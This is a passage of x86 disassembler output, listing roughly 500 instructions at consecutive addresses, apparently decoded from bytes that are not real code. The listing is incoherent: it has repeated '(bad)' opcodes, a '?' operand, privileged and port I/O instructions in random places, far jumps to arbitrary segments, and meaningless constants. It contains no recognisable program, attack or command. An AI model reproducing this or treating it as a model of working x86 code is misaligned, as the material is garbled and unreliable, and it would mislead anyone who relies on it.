  6a4d7d:	push   ss
  6a4d7e:	add    dl,BYTE PTR [edx+edi*8-0x60]
  6a4d82:	xchg   esi,eax
  6a4d83:	loopne 0x6a4d8f
  6a4d85:	mov    dh,0x36
  6a4d87:	mov    edi,0xd7c2e547
  6a4d8c:	icebp  
  6a4d8d:	or     DWORD PTR ds:0x383abcaa,ebp
  6a4d93:	jg     0x6a4daf
  6a4d95:	cmp    ah,BYTE PTR [ecx]
  6a4d97:	mov    BYTE PTR [edi+ecx*8-0x61349ee0],dl
  6a4d9e:	dec    esp
  6a4d9f:	push   eax
  6a4da0:	add    bh,BYTE PTR [ecx+0x2c79e4e3]
  6a4da6:	jnp    0x6a4dfd
  6a4da8:	mov    dh,ah
  6a4daa:	push   esi
  6a4dab:	xchg   ebx,eax
  6a4dac:	sbb    ah,dh
  6a4dae:	sub    eax,0x24b6f057
  6a4db3:	xchg   ebx,eax
  6a4db4:	popa   
  6a4db5:	pop    esp
  6a4db6:	xor    al,0x8b
  6a4db8:	mov    bl,0x29
  6a4dba:	sub    al,BYTE PTR [edi+0xd]
  6a4dbd:	or     ecx,DWORD PTR [esi+0x75]
  6a4dc0:	test   eax,0x3e744d50
  6a4dc5:	xchg   esp,eax
  6a4dc6:	out    dx,al
  6a4dc7:	jns    0x6a4da1
  6a4dc9:	mov    dl,0x3f
  6a4dcb:	pop    edi
  6a4dcc:	pop    ecx
  6a4dcd:	pop    esp
  6a4dce:	add    eax,0xd58b3f9d
  6a4dd3:	xor    DWORD PTR [edi],ecx
  6a4dd5:	fs pusha 
  6a4dd7:	mov    cl,BYTE PTR [eax-0x72ef02ba]
  6a4ddd:	cmp    eax,0x76e64d5d
  6a4de2:	dec    edi
  6a4de3:	mov    eax,ds:0xdd3addf5
  6a4de8:	aam    0x84
  6a4dea:	jmp    0x6a4e24
  6a4dec:	aaa    
  6a4ded:	mov    ebx,0xb053d2c9
  6a4df2:	rcl    esp,0x67
  6a4df5:	out    0x7c,al
  6a4df7:	gs lock js 0x6a4e4c
  6a4dfb:	fdiv   DWORD PTR [ecx-0x1862db11]
  6a4e01:	fadd   DWORD PTR [edi+0x4fa55ba8]
  6a4e07:	sti    
  6a4e08:	pop    esp
  6a4e09:	inc    edx
  6a4e0a:	or     al,0x4d
  6a4e0c:	xchg   DWORD PTR [edx+0x32],edx
  6a4e0f:	fmulp  st(0),st
  6a4e11:	jle    0x6a4e42
  6a4e13:	adc    ecx,edx
  6a4e15:	push   edi
  6a4e16:	and    eax,0x64ffde8c
  6a4e1b:	and    BYTE PTR [edi-0x49],dl
  6a4e1e:	(bad)  
  6a4e1f:	cmp    esi,DWORD PTR [ecx+ebp*1-0x65]
  6a4e23:	xchg   ebx,eax
  6a4e24:	out    0x98,eax
  6a4e26:	xchg   edx,eax
  6a4e27:	rcr    DWORD PTR [ebx+0x54d906e2],cl
  6a4e2d:	push   ecx
  6a4e2e:	popa   
  6a4e2f:	push   ebx
  6a4e30:	fist   WORD PTR [eax-0x7f6bc4b2]
  6a4e36:	loopne 0x6a4ea0
  6a4e38:	loope  0x6a4e9e
  6a4e3a:	ror    BYTE PTR [esi-0x30f2cb55],cl
  6a4e40:	shl    BYTE PTR [eax+0x6b9bc0fd],0xaa
  6a4e47:	shr    BYTE PTR [eax+0x7a],0xff
  6a4e4b:	mov    bh,0x31
  6a4e4d:	dec    ecx
  6a4e4e:	push   ecx
  6a4e4f:	or     al,0xc9
  6a4e51:	push   esi
  6a4e52:	pop    ss
  6a4e53:	sbb    ecx,DWORD PTR [esp+edx*2]
  6a4e56:	add    al,0x4a
  6a4e58:	pusha  
  6a4e59:	je     0x6a4e68
  6a4e5b:	fistp  QWORD PTR [eax]
  6a4e5d:	jne    0x6a4e4e
  6a4e5f:	fiadd  DWORD PTR [esi+0x4b]
  6a4e62:	jmp    0xa450:0xa6ee339c
  6a4e69:	ss out 0x91,eax
  6a4e6c:	push   0x1a77d29
  6a4e71:	dec    ebx
  6a4e72:	mov    edi,0x3485d0b6
  6a4e77:	sbb    BYTE PTR [esi+ebx*4],al
  6a4e7a:	dec    ebx
  6a4e7b:	xor    al,BYTE PTR [ecx+0x6]
  6a4e7e:	adc    BYTE PTR [edx-0x3bfba9d2],bl
  6a4e84:	fisubr DWORD PTR [ecx+eiz*2-0x30cf91b5]
  6a4e8b:	call   0x54bc12cf
  6a4e90:	aad    0x6a
  6a4e92:	cmp    ecx,DWORD PTR [esi+eax*1+0xf316424]
  6a4e99:	iretw  
  6a4e9b:	jbe    0x6a4ea0
  6a4e9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a4e9e:	scas   al,BYTE PTR es:[edi]
  6a4e9f:	std    
  6a4ea0:	cmp    BYTE PTR [edx],ch
  6a4ea2:	adc    al,0xab
  6a4ea4:	mov    ch,al
  6a4ea6:	and    ch,al
  6a4ea8:	mov    edx,0x81deea9c
  6a4ead:	mov    ds:0xb714ba5c,al
  6a4eb2:	bound  esp,QWORD PTR [ecx+0x1c]
  6a4eb5:	pop    edx
  6a4eb6:	pop    ss
  6a4eb7:	mov    bh,0x4f
  6a4eb9:	cwde   
  6a4eba:	pop    ss
  6a4ebb:	jae    0x6a4e3f
  6a4ebd:	arpl   WORD PTR [esi-0x3e],ax
  6a4ec0:	(bad)
  6a4ec3:	sub    eax,0xf8c4e07f
  6a4ec8:	stos   DWORD PTR es:[edi],eax
  6a4ec9:	sub    al,0xc6
  6a4ecc:	pop    es
  6a4ecd:	lods   eax,DWORD PTR ds:[esi]
  6a4ece:	dec    edx
  6a4ecf:	or     al,0xa
  6a4ed1:	mov    esp,0xe2d488c3
  6a4ed6:	mov    ds,edi
  6a4ed8:	xor    DWORD PTR [ebx+0x39],esi
  6a4edb:	in     eax,dx
  6a4edc:	xor    BYTE PTR [ebp-0x3f10648f],bh
  6a4ee2:	sub    ecx,esi
  6a4ee4:	aam    0xb5
  6a4ee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a4ee7:	ret    
  6a4ee8:	pop    ds
  6a4ee9:	mov    edi,0x835a27b0
  6a4eee:	xor    esi,DWORD PTR [ecx+esi*2]
  6a4ef1:	in     eax,0xfa
  6a4ef3:	std    
  6a4ef4:	dec    eax
  6a4ef5:	(bad)  
  6a4ef6:	(bad)
  6a4ef9:	push   ds
  6a4efa:	out    dx,al
  6a4efb:	pop    eax
  6a4efc:	inc    ecx
  6a4efd:	mov    ecx,0x33263156
  6a4f02:	sahf   
  6a4f03:	jecxz  0x6a4f5a
  6a4f05:	add    eax,0xdd03ecb2
  6a4f0a:	push   ss
  6a4f0b:	shl    DWORD PTR [ecx],1
  6a4f0d:	pop    es
  6a4f0e:	push   cs
  6a4f0f:	cli    
  6a4f10:	lock xor eax,DWORD PTR [ecx+0x1c3f3942]
  6a4f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a4f18:	cmp    cl,ch
  6a4f1a:	fiadd  DWORD PTR [eax+0x165bc3e8]
  6a4f20:	jne    0x6a4f3c
  6a4f22:	jae    0x6a4ee3
  6a4f24:	loopne 0x6a4f8e
  6a4f26:	mov    ds:0x1000f1f9,al
  6a4f2b:	shr    DWORD PTR ds:0xa7d4786a,0x70
  6a4f32:	push   cs
  6a4f33:	pop    esp
  6a4f34:	pushf  
  6a4f35:	xor    edx,DWORD PTR [eax-0x30]
  6a4f38:	scas   al,BYTE PTR es:[edi]
  6a4f39:	popa   
  6a4f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a4f3b:	pop    ss
  6a4f3c:	cmp    eax,0xf37bc931
  6a4f41:	pop    ds
  6a4f42:	sbb    al,0x3c
  6a4f44:	xor    bp,WORD PTR [esi+eiz*1-0x6d502014]
  6a4f4c:	rcl    edi,cl
  6a4f4e:	cmp    DWORD PTR [edi-0x4a85ad09],0x41f654a7
  6a4f58:	out    0xd1,eax
  6a4f5a:	jle    0x6a4f50
  6a4f5c:	lahf   
  6a4f5d:	and    dh,BYTE PTR [eax+edx*2]
  6a4f60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a4f61:	fisttp QWORD PTR [esi+0x7bd7dea1]
  6a4f67:	xor    BYTE PTR ds:0x4e3010c9,bl
  6a4f6d:	aam    0x10
  6a4f6f:	fnstenv [ebp-0x8]
  6a4f72:	jb     0x6a4fd5
  6a4f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a4f75:	jmp    0x3042a780
  6a4f7a:	mov    edx,0x79221d3f
  6a4f7f:	aaa    
  6a4f80:	mov    esp,0xc3e19a30
  6a4f85:	mov    ah,0xe
  6a4f87:	xlat   BYTE PTR ds:[ebx]
  6a4f88:	cmp    ecx,DWORD PTR [ebp+eax*1-0x3ec15b87]
  6a4f8f:	hlt    
  6a4f90:	jae    0x6a5010
  6a4f92:	mov    al,ds:0xafda1300
  6a4f97:	inc    esp
  6a4f98:	inc    ebp
  6a4f99:	scas   eax,DWORD PTR es:[edi]
  6a4f9a:	cmc    
  6a4f9b:	std    
  6a4f9c:	out    0x51,al
  6a4f9e:	sub    ah,bl
  6a4fa0:	div    BYTE PTR [esi]
  6a4fa2:	ss out 0x10,al
  6a4fa5:	rcpps  xmm2,XMMWORD PTR [eax+0x39b4472]
  6a4fac:	xchg   BYTE PTR [ebp+0x308c9319],dh
  6a4fb2:	(bad)  
  6a4fb3:	jecxz  0x6a4fcb
  6a4fb5:	pop    edx
  6a4fb6:	mov    cl,0x24
  6a4fb8:	sar    BYTE PTR [edx],cl
  6a4fba:	jmp    0x6a4fc8
  6a4fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a4fbd:	retf   0x4497
  6a4fc0:	push   edx
  6a4fc1:	clc    
  6a4fc2:	clc    
  6a4fc3:	or     DWORD PTR [edi-0x23],edx
  6a4fc6:	mov    edx,0x663dd0a4
  6a4fcb:	pop    ebp
  6a4fcc:	xor    bh,BYTE PTR [esi+0x30]
  6a4fcf:	mov    ebx,0x89d18bd9
  6a4fd4:	mov    bl,0xdf
  6a4fd6:	daa    
  6a4fd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a4fd8:	mov    cl,0xd9
  6a4fda:	shl    dl,0x5c
  6a4fdd:	push   ecx
  6a4fde:	jo     0x6a5042
  6a4fe0:	mov    dh,0x23
  6a4fe2:	not    BYTE PTR [ecx+0x32]
  6a4fe5:	jmp    0x14da:0x898ab8b5
  6a4fec:	neg    BYTE PTR [esi-0x3ff7537f]
  6a4ff2:	fstp   st(2)
  6a4ff4:	aaa    
  6a4ff5:	push   0xa32fd381
  6a4ffa:	pop    ebp
  6a4ffb:	mov    esi,ss
  6a4ffd:	(bad)  
  6a4fff:	jbe    0x6a503b
  6a5001:	inc    ebx
  6a5002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a5003:	daa    
  6a5004:	mov    dh,0xb0
  6a5006:	adc    BYTE PTR ss:[ecx],dl
  6a5009:	dec    edi
  6a500a:	xchg   DWORD PTR [ebx-0x56],esi
  6a500d:	add    dh,BYTE PTR [ecx-0x2d8996b8]
  6a5013:	pop    esi
  6a5014:	xor    dh,BYTE PTR [eax-0x545fec1a]
  6a501a:	aam    0xe9
  6a501c:	fstp   QWORD PTR [edx+0x64]
  6a501f:	or     eax,0x90e654fb
  6a5024:	xchg   DWORD PTR [edx+eax*2-0x5b],ebp
  6a5028:	call   0xf27b:0x6ca33a89
  6a502f:	hlt    
  6a5030:	cs mov cl,0xf2
  6a5033:	xor    al,0x3b
  6a5035:	mov    ch,0x32
  6a5037:	xchg   edx,eax
  6a5038:	mov    ecx,DWORD PTR [esi]
  6a503a:	push   edi
  6a503b:	add    ch,bl
  6a503d:	or     al,0x6b
  6a503f:	ja     0x6a5093
  6a5041:	push   es
  6a5042:	sbb    BYTE PTR fs:[esi],cl
  6a5045:	std    
  6a5046:	cmp    dl,cl
  6a5048:	sbb    esp,DWORD PTR [eax+0x5d370103]
  6a504e:	gs cmc 
  6a5050:	int3   
  6a5051:	sbb    eax,DWORD PTR [eax]
  6a5053:	sbb    al,0x9
  6a5055:	mov    ah,0x3c
  6a5057:	repz mov ecx,0x1239ab55
  6a505d:	jb     0x6a50bf
  6a505f:	mul    cl
  6a5061:	popa   
  6a5062:	push   esi
  6a5063:	(bad)  
  6a5064:	and    BYTE PTR [esi+0x475da4ea],ch
  6a506a:	and    ch,BYTE PTR [edi+0x187d6240]
  6a5070:	test   al,0xb2
  6a5072:	test   eax,0xfa37915a
  6a5077:	pop    eax
  6a5078:	inc    ebp
  6a5079:	push   0xffffff82
  6a507b:	and    al,ah
  6a507d:	jle    0x6a50e0
  6a507f:	xchg   ebx,eax
  6a5080:	dec    eax
  6a5081:	int3   
  6a5082:	fsub   st(2),st
  6a5084:	ficomp DWORD PTR [ebp+0x2eb021cc]
  6a508a:	ret    0x7fe3
  6a508d:	outs   dx,BYTE PTR ds:[esi]
  6a508e:	jmp    0x6a50ab
  6a5090:	or     DWORD PTR ds:0x40ab4168,ebp
  6a5096:	repnz fbstp TBYTE PTR [esi+0x704ac9d2]
  6a509d:	mov    dh,0x15
  6a509f:	test   eax,0x3484a683
  6a50a4:	out    0x42,al
  6a50a6:	stos   DWORD PTR es:[edi],eax
  6a50a7:	inc    esi
  6a50a8:	xchg   edx,eax
  6a50a9:	jo     0x6a5057
  6a50ab:	test   eax,0x48e1a56a
  6a50b0:	inc    edx
  6a50b1:	test   BYTE PTR [esi-0x52],cl
  6a50b4:	pusha  
  6a50b5:	add    eax,0x95c8aea8
  6a50ba:	idiv   al
  6a50bc:	sbb    esp,edi
  6a50be:	push   esp
  6a50bf:	mov    eax,0xbb6714aa
  6a50c4:	aad    0x30
  6a50c6:	mov    esi,0xbdb94724
  6a50cb:	adc    dh,BYTE PTR [ebp-0x6a4247d6]
  6a50d1:	arpl   WORD PTR [esp+ecx*4],bx
  6a50d4:	add    BYTE PTR ds:0x331f56b1,0xbc
  6a50db:	and    al,0xff
  6a50dd:	add    esp,0x47a15fd2
  6a50e3:	out    dx,eax
  6a50e4:	ss ins DWORD PTR es:[edi],dx
  6a50e6:	or     BYTE PTR [eax+0x4e],dh
  6a50e9:	popf   
  6a50ea:	sub    eax,0xd20b5769
  6a50ef:	clc    
  6a50f0:	mov    al,ds:0xa1cf88c7
  6a50f5:	out    0x78,eax
  6a50f7:	and    esi,DWORD PTR [ecx]
  6a50f9:	jbe    0x6a5081
  6a50fb:	and    ah,0xb0
  6a50fe:	test   BYTE PTR [edi+0x61],dh
  6a5101:	push   ds
  6a5102:	or     al,0xfc
  6a5104:	or     cl,al
  6a5106:	std    
  6a5107:	lea    eax,[edi-0x1b74266]
  6a510d:	iret   
  6a510e:	pop    eax
  6a510f:	test   BYTE PTR [ebx],bl
  6a5111:	jmp    0xb0d7:0xcb3bc4c5
  6a5118:	sbb    DWORD PTR [ebp-0x72],eax
  6a511b:	fimul  DWORD PTR [ecx]
  6a511d:	repnz xor BYTE PTR gs:[eax+eiz*4],0x4b
  6a5123:	sub    BYTE PTR [esp+ebp*2-0x57],0x5
  6a5128:	cmp    BYTE PTR [edi+ebx*4+0x61],bl
  6a512c:	mov    ecx,DWORD PTR [ecx]
  6a512e:	and    BYTE PTR [esi],dh
  6a5130:	sub    DWORD PTR [edx+0x3d2956dd],ebx
  6a5136:	xor    dh,BYTE PTR ds:0x60840181
  6a513c:	int3   
  6a513d:	inc    esi
  6a513e:	cmp    bl,0xd4
  6a5141:	sahf   
  6a5142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a5143:	mov    dl,0x86
  6a5145:	into   
  6a5146:	fbld   TBYTE PTR [esi+0x6d]
  6a5149:	pusha  
  6a514a:	lock add al,0x95
  6a514d:	call   0xbf379a7f
  6a5152:	lds    esp,FWORD PTR [ecx]
  6a5154:	cdq    
  6a5155:	test   al,0x3b
  6a5157:	das    
  6a5158:	aas    
  6a5159:	stos   BYTE PTR es:[edi],al
  6a515a:	(bad)  
  6a515b:	mov    ebp,0xc85db222
  6a5160:	inc    ebp
  6a5161:	xor    dh,BYTE PTR [edi-0x58570555]
  6a5167:	das    
  6a5168:	fsubr  QWORD PTR [ebp+edi*1+0x24c3718f]
  6a516f:	sbb    DWORD PTR [eax+0x7a],edx
  6a5172:	add    esi,DWORD PTR [ebx-0x61b83b42]
  6a5178:	stc    
  6a5179:	ret    
  6a517a:	das    
  6a517b:	sbb    al,0x1a
  6a517d:	mov    dh,0x11
  6a517f:	dec    eax
  6a5180:	(bad)  
  6a5181:	dec    edx
  6a5182:	mov    dh,0x88
  6a5184:	mul    BYTE PTR [ebx]
  6a5186:	xor    DWORD PTR [ebx+0x212ad0c6],0xffffff93
  6a518d:	pop    ds
  6a518e:	pop    ecx
  6a518f:	mov    ebp,0x605052f6
  6a5194:	and    BYTE PTR [ebx+0x4e],ah
  6a5197:	shl    eax,cl
  6a5199:	fsub   QWORD PTR [esp+edi*8]
  6a519c:	dec    sp
  6a519e:	mov    al,ds:0x67a4f566
  6a51a3:	hlt    
  6a51a4:	xor    DWORD PTR [ebx+ecx*1+0x2587130b],eax
  6a51ab:	xchg   edx,eax
  6a51ac:	(bad)  
  6a51ad:	in     al,dx
  6a51ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a51af:	push   es
  6a51b0:	mov    al,ds:0x914cc6b4
  6a51b5:	adc    ch,BYTE PTR [esp+ebx*1+0x49586465]
  6a51bc:	xchg   edx,eax
  6a51bd:	fyl2x  
  6a51bf:	add    ecx,DWORD PTR [edi-0x2a]
  6a51c2:	xlat   BYTE PTR ds:[ebx]
  6a51c3:	jns    0x6a5223
  6a51c5:	cmp    al,0x12
  6a51c7:	stos   BYTE PTR es:[edi],al
  6a51c8:	shl    DWORD PTR [esi],1
  6a51ca:	xchg   edi,eax
  6a51cb:	pop    esp
  6a51cc:	dec    edi
  6a51cd:	(bad)  [edx]
  6a51cf:	stos   DWORD PTR es:[edi],eax
  6a51d0:	pusha  
  6a51d1:	int3   
  6a51d2:	loope  0x6a522a
  6a51d4:	jmp    0x6a5255
  6a51d6:	inc    sp
  6a51d8:	jne    0x6a51de
  6a51da:	mov    WORD PTR [eax+edx*1],ds
  6a51dd:	popa   
  6a51de:	stos   BYTE PTR es:[edi],al
  6a51df:	outs   dx,DWORD PTR ds:[esi]
  6a51e0:	mov    ch,0x66
  6a51e2:	mov    edi,DWORD PTR [edx+0x44a8416d]
  6a51e8:	xchg   ebp,eax
  6a51e9:	xchg   ebp,eax
  6a51ea:	gs cmps DWORD PTR ss:[esi],DWORD PTR es:[edi]
  6a51ed:	mov    eax,DWORD PTR [edx+ebp*8]
  6a51f0:	push   0xd2d8ad2d
  6a51f5:	hlt    
  6a51f6:	adc    BYTE PTR [edx+0x624505fa],ch
  6a51fc:	mov    edi,0xe4f789b4
  6a5201:	sbb    eax,0xb21f3d9d
  6a5206:	retf   0x739d
  6a5209:	imul   ecx,DWORD PTR [ebx-0x37],0x4e
  6a520d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a520e:	cdq    
  6a520f:	add    BYTE PTR [ebx],cl
  6a5211:	shl    BYTE PTR [ecx],cl
  6a5213:	out    dx,al
  6a5214:	mov    ecx,0xd6c7b510
  6a5219:	add    ah,BYTE PTR [eax-0x2a]
  6a521c:	int    0x5a
  6a521e:	scas   eax,DWORD PTR es:[edi]
  6a521f:	aaa    
  6a5220:	ret    0x9a50
  6a5223:	clc    
  6a5224:	(bad)  
  6a5225:	je     0x6a5268
  6a5227:	out    dx,al
  6a5228:	aas    
  6a5229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a522a:	cmp    al,0xd0
  6a522c:	push   eax
  6a522d:	mov    cl,0x9f
  6a522f:	inc    edx
  6a5230:	push   ecx
  6a5231:	sti    
  6a5232:	fs jnp 0x6a51da
  6a5235:	cmp    edi,esp
  6a5237:	pop    edx
  6a5238:	(bad)  
  6a523a:	adc    ebx,DWORD PTR [esi+0x18941959]
  6a5240:	scas   eax,DWORD PTR es:[edi]
  6a5241:	popf   
  6a5242:	loope  0x6a5288
  6a5244:	js     0x6a5231
  6a5246:	ror    edi,0x3a
  6a5249:	in     al,0x6c
  6a524b:	fidiv  DWORD PTR [ebx+0x5b344440]
  6a5251:	enter  0xebbc,0x74
  6a5255:	and    eax,0x3d68c2a6
  6a525a:	sub    eax,0x75e119f6
  6a525f:	add    edi,esi
  6a5261:	fs jns 0x6a524f
  6a5264:	out    0xc9,al
  6a5266:	pop    es
  6a5267:	sub    al,0x83
  6a5269:	cwde   
  6a526a:	mov    esp,0x9514d235
  6a526f:	fisubr WORD PTR [eax+ebx*4-0x7982e0d2]
  6a5276:	stc    
  6a5277:	ss pop eax
  6a5279:	inc    edi
  6a527a:	ja     0x6a52d7
  6a527c:	rcl    BYTE PTR [ebp-0x4f119c1e],1
  6a5282:	cmp    al,0x2f
  6a5284:	enter  0x9b6a,0x51
  6a5288:	mov    ch,0xcd
  6a528a:	test   eax,0x9dafdd46
  6a528f:	cwde   
  6a5290:	ror    BYTE PTR [edi-0x8],1
  6a5293:	mov    dh,0x88
  6a5295:	cmp    cl,BYTE PTR [ebp-0x7c902ab]
  6a529b:	popf   
  6a529c:	mov    ah,0x70
  6a529e:	adc    DWORD PTR [ecx+0x5563d9e8],0x7a3a83ca
  6a52a8:	ficomp WORD PTR [eax]
  6a52aa:	mov    al,dh
  6a52ac:	jmp    0x5ab7:0x1087a1fc
  6a52b3:	xchg   ecx,eax
  6a52b4:	cmp    dh,BYTE PTR [ebp+0x77]
  6a52b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a52b8:	mov    bl,bl
  6a52ba:	sbb    DWORD PTR [eax+eax*8],ecx
  6a52bd:	fisub  DWORD PTR [esi]
  6a52bf:	mov    edi,0x7005e51c
  6a52c4:	xchg   ebx,eax
  6a52c5:	sub    eax,0xaf8db173
  6a52ca:	or     cl,ch
  6a52cc:	jge    0x6a533d
  6a52ce:	sbb    ebx,ebp
  6a52d0:	std    
  6a52d1:	cmp    ah,ch
  6a52d3:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  6a52d5:	or     DWORD PTR [esp+edi*1],0xffffffe6
  6a52d9:	aas    
  6a52da:	inc    ecx
  6a52db:	dec    esp
  6a52dc:	int3   
  6a52dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a52de:	add    al,0xd4
  6a52e0:	xor    al,0xaf
  6a52e2:	jne    0x6a52b8
  6a52e4:	leave  
  6a52e5:	xchg   ebp,eax
  6a52e6:	not    bh
  6a52e8:	pop    edi
  6a52e9:	dec    edi
  6a52ea:	test   BYTE PTR [esi],0x8e
  6a52ed:	xchg   esp,eax
  6a52ee:	(bad)  
  6a52ef:	cdq    
  6a52f0:	das    
  6a52f1:	push   0xffffff9d
  6a52f3:	add    DWORD PTR [ecx],0x2938702b
  6a52f9:	cmc    
  6a52fa:	ds mov ebx,0x28dbf251
  6a5300:	push   ebp
  6a5301:	xchg   ebp,eax
  6a5302:	push   0x42
  6a5304:	sahf   
  6a5305:	mov    al,ds:0x1841d953
  6a530a:	adc    al,0xc5
  6a530c:	and    DWORD PTR [ebp+0x51],ecx
  6a530f:	xor    DWORD PTR [edx],ebx
  6a5311:	pop    esp
  6a5312:	adc    eax,0x78ef056a
  6a5317:	adc    ah,dh
  6a5319:	and    bl,BYTE PTR [ecx+edi*1]
  6a531c:	jns    0x6a538d
  6a531e:	in     al,0x25
  6a5320:	fwait
  6a5321:	dec    ebx
  6a5322:	xlat   BYTE PTR ds:[ebx]
  6a5323:	cmp    eax,0x4cac1a45
  6a5328:	lods   al,BYTE PTR ds:[esi]
  6a5329:	adc    eax,0x34185142
  6a532e:	bound  edx,QWORD PTR [edi]
  6a5330:	jecxz  0x6a52f2
  6a5332:	stc    
  6a5333:	pop    es
  6a5334:	mov    eax,ds:0x10063c1c
  6a5339:	xchg   DWORD PTR [eax+0x27],ebp
  6a533c:	lods   eax,DWORD PTR ds:[esi]
  6a533d:	cli    
  6a533e:	mov    BYTE PTR [ebp+0x27],cl
  6a5341:	fisub  WORD PTR [ebx+0x5c02a3ca]
  6a5347:	dec    edx
  6a5348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a5349:	and    DWORD PTR [ecx],0xfffffff6
  6a534c:	dec    esp
  6a534d:	mov    ebp,DWORD PTR [esi]
  6a534f:	dec    eax
  6a5350:	int    0x13
  6a5352:	out    dx,al
  6a5353:	stos   DWORD PTR es:[edi],eax
  6a5354:	aad    0x8c
  6a5356:	loop   0x6a5337
  6a5358:	mov    dh,0xc6
  6a535a:	fwait
  6a535b:	xor    al,0x61
  6a535d:	push   eax
  6a535e:	addr16 int3 
  6a5360:	imul   ecx,DWORD PTR [edi],0x60
  6a5363:	jl     0x6a53a4
  6a5365:	xchg   ebx,eax
  6a5366:	and    eax,0x87d17e2
  6a536b:	push   esp
  6a536c:	sbb    eax,0x5edf4df2
  6a5371:	test   BYTE PTR [eax-0x80],0x40
  6a5375:	test   al,0x2c
  6a5377:	adc    BYTE PTR [ebp+0x4eb63beb],bh
  6a537d:	add    bh,BYTE PTR [edx]
  6a537f:	mov    cl,0xc5
  6a5381:	push   ebx
  6a5382:	fwait
  6a5383:	(bad)  
  6a5384:	pop    ds
  6a5385:	jbe    0x6a5406
  6a5387:	mov    ss,WORD PTR [edi]
  6a5389:	std    
  6a538a:	loope  0x6a53f4
  6a538c:	adc    bl,BYTE PTR [edi-0x20]
  6a538f:	adc    al,0x68
  6a5391:	imul   esi,DWORD PTR [eax-0x2b4746ba],0xa2282578
  6a539b:	xchg   ecx,eax
  6a539c:	or     al,0xca
  6a539e:	pop    esp
  6a539f:	fadd   DWORD PTR [ebx+0xf954a4e]
  6a53a6:	and    BYTE PTR [eax-0x6c],ah
  6a53a9:	jge    0x6a538f
  6a53ab:	dec    edi
  6a53ac:	sahf   
  6a53ad:	pop    esp
  6a53ae:	mov    ecx,0x33384122
  6a53b3:	shl    al,1
  6a53b5:	sbb    ecx,DWORD PTR [esi+0x43]
  6a53b8:	pop    edx
  6a53b9:	mov    ebp,edx
  6a53bb:	add    BYTE PTR [ebx],bh
  6a53bd:	enter  0x37ad,0x5b
  6a53c1:	inc    edx
  6a53c2:	test   BYTE PTR [edx-0x311e8a47],bh
  6a53c8:	ins    DWORD PTR es:[edi],dx
  6a53c9:	pop    ebx
  6a53ca:	mov    WORD PTR [ecx-0x5a],ds
  6a53cd:	inc    esi
  6a53ce:	loopne 0x6a5400
  6a53d0:	adc    esp,DWORD PTR [ebx+ecx*2]
  6a53d3:	popf   
  6a53d4:	aas    
  6a53d5:	push   es
  6a53d6:	leave  
  6a53d7:	out    dx,eax
  6a53d8:	pop    ds
  6a53d9:	mov    cl,0x24
  6a53db:	icebp  
  6a53dc:	sbb    al,0x69
  6a53de:	out    0x23,al
  6a53e0:	cmc    
  6a53e1:	and    esp,ebp
  6a53e3:	cmp    eax,0x63cafa3e
  6a53e8:	or     cl,dl
  6a53ea:	xchg   ebp,eax
  6a53eb:	pushf  
  6a53ec:	dec    ebp
  6a53ed:	les    ebp,FWORD PTR [esp+edx*1-0x4048d98e]
  6a53f4:	inc    ebx
  6a53f5:	test   al,al
  6a53f7:	mov    eax,0x28533c71
  6a53fd:	and    DWORD PTR [edx],0x131fa233
  6a5403:	and    edx,DWORD PTR [ecx+0x2]
  6a5406:	xchg   DWORD PTR [ebp+0x35ad62e0],ebp
  6a540c:	jg     0x6a53bd
  6a540e:	bound  ebp,QWORD PTR [esi-0x2bf8a8e9]
  6a5414:	mov    eax,0xcc93f23d
  6a5419:	xchg   ecx,eax
  6a541a:	cmp    ebx,ecx
  6a541c:	lea    esp,[edi+ebx*8+0x75]
  6a5420:	add    BYTE PTR [esi+0x2c],al
  6a5423:	sub    DWORD PTR [ebx-0x52496fa1],0x19
  6a542a:	jle    0x6a545c
  6a542c:	leave  
  6a542d:	out    dx,eax
  6a542e:	jg     0x6a53cc
  6a5430:	ret    0x23ed
  6a5433:	fs or  eax,esi
  6a5436:	jecxz  0x6a53cb
  6a5438:	shl    DWORD PTR [edx],1
  6a543a:	xor    ebp,esp
  6a543c:	int    0x17
  6a543e:	jle    0x6a5425
  6a5440:	arpl   bp,cx
  6a5442:	jl     0x6a549f
  6a5444:	daa    
  6a5445:	mov    al,0xe
  6a5447:	inc    esp
  6a5448:	push   cs
  6a5449:	or     edx,ebp
  6a544b:	ffreep st(7)
  6a544d:	mov    DWORD PTR ds:0x15a7b51a,ebx
  6a5453:	jne    0x6a53ea
  6a5455:	shl    DWORD PTR [ebx-0x36],cl
  6a5458:	push   es
  6a5459:	imul   esi,DWORD PTR [edi+0x544e7354],0xb
  6a5460:	and    ebx,DWORD PTR [ecx]
  6a5462:	inc    ecx
  6a5463:	cmp    DWORD PTR [edi-0x2fd05363],eax
  6a5469:	pop    ecx
  6a546a:	cwde   
  6a546b:	shl    DWORD PTR [edi-0x32154104],cl
  6a5471:	cmp    edx,DWORD PTR [edx+0x28819bbe]
  6a5477:	mov    ?,WORD PTR ds:0xe9c1419c
  6a547d:	mov    edx,0xa6a218f4
  6a5482:	or     bh,BYTE PTR [ecx+0x45a4b078]
  6a5488:	mov    ebx,0x878a6f5e
  6a548d:	imul   ebp,DWORD PTR [esi+edi*8-0x69],0x4a0cd58a
  6a5495:	cs mov ebp,0x7d048bcb
  6a549b:	jecxz  0x6a548c
  6a549d:	add    DWORD PTR [ecx-0x5f],ebp
  6a54a0:	fadd   DWORD PTR [ebp-0x5d9bb3ab]
  6a54a6:	mov    al,ds:0xfffddce5
  6a54ab:	sub    BYTE PTR [eax+0x6a23af90],cl
